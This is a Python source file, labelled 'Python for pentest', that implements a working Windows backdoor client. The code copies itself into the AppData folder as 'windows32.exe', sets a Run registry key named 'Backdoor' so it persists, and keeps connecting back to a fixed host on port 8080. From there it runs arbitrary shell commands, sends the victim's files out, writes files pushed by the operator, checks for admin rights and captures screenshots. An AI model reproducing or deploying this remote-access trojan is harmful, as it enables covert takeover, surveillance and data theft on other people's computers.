##client.py
# screen capture
#Python for pentest

import socket
import subprocess
import ctypes
import os
import time
import sys
import shutil
from PIL import ImageGrab
import tempfile


def initiate():
    registry()
    tuneConnection()

def registry():
    location = os.environ['appdata'] + '\\windows32.exe'
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)

def tuneConnection():
    mysocket = socket.socket()
    while True:
        try:
            time.sleep(10)
            mysocket.connect(("192.168.159.134", 8080))
            conn(mysocket)
        except:
            tuneConnection()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def letGrab(mysocket, path):
    try:
        if os.path.exists(path):
            with open(path, 'rb') as f:
                while chunk := f.read(1024):
                    mysocket.send(chunk)
            mysocket.send(b'DONE')  # Indicate end of file transfer
        else:
            mysocket.send(b'File not found')
    except Exception as e:
        mysocket.send(f"[-] Error in file transfer: {str(e)}".encode())

def letSend(mysocket, path, fileName):
    try:
        os.makedirs(path, exist_ok=True) #Ensure path exists
        full_path = os.path.join(path, fileName)
        with open(full_path, 'ab') as f:
            while True:
                bits = mysocket.recv(1024)
                if bits.endswith(b"DONE"):
                    f.write(bits[:-4])
                    break
                if b"File not found" in bits or b"File is empty" in bits:
                    print("[-] Server couldn't send file.")
                    break
                f.write(bits)
        print(f"[+] File received and saved as: {full_path}")
    except Exception as e:
        print(f"[-]Error receiving file: {str(e)}")

def transfer(mysocket, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(5000)
        while len(packet) > 0:
            mysocket.send(packet)
            packet = f.read(1024)
        f.close()
        mysocket.send('DONE'.encode())
    else:
        mysocket.send('File not found'.encode())

def conn(mysocket):
    # mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # mysocket.connect(("192.168.159.134", 8080))
        # print("[+] Connected to server")

        while True:
            cmd = mysocket.recv(1024).decode()
            if not cmd:
                continue

            if cmd.lower() == "tem":
                print("[+] Closing connection")
                mysocket.close()
                break

            elif cmd == "checkPrivilege":
                if is_admin():
                    mysocket.send(b"[+] Running with Admin Privileges\n")
                else:
                    mysocket.send(b"[-] User privileges. (No Admin Privileges)\n")

            elif cmd.startswith("grab"):
                parts = cmd.split("*")
                if len(parts) < 2:
                    mysocket.send(b"[-] Invalid grab command format")
                    continue
                cmds, path = parts
                letGrab(mysocket, path)

            elif cmd.startswith("send"):
                send, path,fileName = cmd.split("*")
                try:
                    letSend(mysocket, path, fileName)
                except Exception as e:
                    informToServer = "[-] Some Error Occured." + str(e)
                    mysocket.send(informToServer.encode())

            elif 'screencap' in cmd:
                # Create a temp dir to store our screenshot file
                # Sample Dirpath: C:\users\user\appdata\local\temp\tmp8dfj57ox
                dirpath = tempfile.mkdtemp()
                # grab() method takes a screenshot of the screen
                # save() method saves the snapshot in the temp dir
                ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")
                transfer(mysocket, dirpath + "\img.jpg")  # transfer to the server using our transfer function
                shutil.rmtree(dirpath)  # delete the temp directory using shutil remove tree


            else:
                CMD = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, error = CMD.communicate()
                mysocket.send(output + error)

    except Exception as e:
        mysocket.send(f"[-] Error in : {str(e)}".encode())
        mysocket.close()

def main():
    initiate()

if __name__ == "__main__":
    main()
